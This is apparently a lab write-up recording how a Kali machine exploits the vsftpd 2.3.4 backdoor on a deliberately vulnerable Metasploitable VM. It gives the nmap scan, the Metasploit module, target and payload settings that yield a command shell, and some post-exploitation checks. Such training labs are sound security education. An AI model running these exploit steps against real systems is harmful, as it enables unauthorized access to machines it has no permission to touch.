# Metasploit Lab — shell Session on Metasploitable achieved

## Objective
Exploit Metasploitable Linux machine and gain shell from Kali.

## Environment
- Attacker: Kali Linux (192.168.18.128)
- Target: Metasploitable (192.168.18.129)

## Steps

### 1. Scan the Target
```bash
nmap -sV 192.168.18.129
```
Result: Multiple vulnerable services found (vsftpd, SSH, Apache)

### 2. Start Metasploit
```bash
sudo systemctl start postgresql
msfconsole
```

### 3. Exploit vsftpd Backdoor
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.18.129                # target ip
set PAYLOAD cmd/unix/interact
run
```

### 4. Gain Shell Access
Result: Command shell obtained on target

### 5. Post Exploitation
```bash
whoami              # check current user
id                  # show user ID and groups
uname -a            # kernel information
```

## Vulnerability
vsftpd 2.3.4 contains a backdoor that opens port 6200
allowing remote command execution.

## Tools Used
- Kali Linux (192.168.18.128)
- Metasploit Framework
- Nmap

## Status
✅ Exploitation successful - shell access obtained
